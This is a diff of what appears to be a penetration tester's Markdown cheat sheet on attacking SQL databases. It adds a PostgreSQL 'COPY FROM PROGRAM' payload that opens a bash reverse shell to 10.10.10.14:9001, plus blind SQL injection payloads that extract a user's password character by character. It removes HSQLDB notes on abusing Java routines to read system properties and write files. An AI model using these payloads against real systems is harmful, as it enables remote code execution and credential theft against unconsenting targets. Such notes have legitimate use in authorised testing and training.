@@ -1,22 +1,3 @@
-# SQL Databases
-## Sqlite
-### Open DB
-```sql
-# Open DB
-sqlite3 cereal.db
-
-# Dump DB
-.dump
-```
-
-
-## MySQL
-### Enumerate DB
-```sql
-# Describe table
-DESCRIBE accounts
-```
-
 ## PostgreSQL
 > Note Stacked Queries may break application logic during SQLi;
 > In PostgreSQL a semicolon can delimeter command and thus can execute totally new commands in SQLi
@@ -29,6 +10,20 @@ To directly execute SQL Queries directly against the database, Use the `pgAdmin`
 psql.exe -U postgres -p 15432
 ```
 
+#### From Bash
+```bash
+sudo -i -u postgres
+psql answers
+```
+
+### Execute System commands
+```SQL
+DROP TABLE IF EXISTS output;
+
+create table output (line text);
+
+copy output from program 'bash -c "bash -i >& /dev/tcp/10.10.10.14/9001 0>&1"';
+```
 
 ### Examine Table
 ```sql
@@ -38,6 +33,16 @@ psql.exe -U postgres -p 15432
 ### Confirm SQLi Injection
 ```sql
 ;select pg_sleep(10);
+```
+
+### Blind SQLi 
+```sql
+# Boolean statment, where %s is ur nested query
+2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)
+
+# Where first %d is charchter index in string and second %d is guess value
+ASCII(SUBSTR((SELECT password FROM users WHERE user_id=1),%d,1))<%d
+ASCII(SUBSTR((SELECT password FROM users WHERE user_id=1),%d,1))>%d
 ```
 
 ### Filter Evasion
@@ -176,37 +181,5 @@ select lo_export(1337, 'C:\\new_win.ini');
 ```
 
 
-## HSQLDB
-### Connect to HSQLDB
-```java
-java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
-
-// Or
-java -jar hsqldb-2.6.0-jdk11.jar
-```
-### Java Language Routines
- Use a function if the java method returns a variable. Otherwise, if the java method returns void use procedures.
- #### Create Function
-```sql
-CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
-LANGUAGE JAVA 
-DETERMINISTIC NO SQL
-EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
-```
-#### Use Function
-```sql
-VALUES(systemprob('java.class.path'))
-```
-
-#### Create WriteBytesToFile Function
-```sql
-CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
-LANGUAGE JAVA 
-DETERMINISTIC NO SQL
-EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
-```
-
-#### Call WriteBytesToFile Function
-```sql
-call writeBytesToFilename('test.txt', cast('497420776f726b656421' AS VARBINARY(1024))
-```
+### References
+[Command Execution in psql 9.3 < Latest ](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)
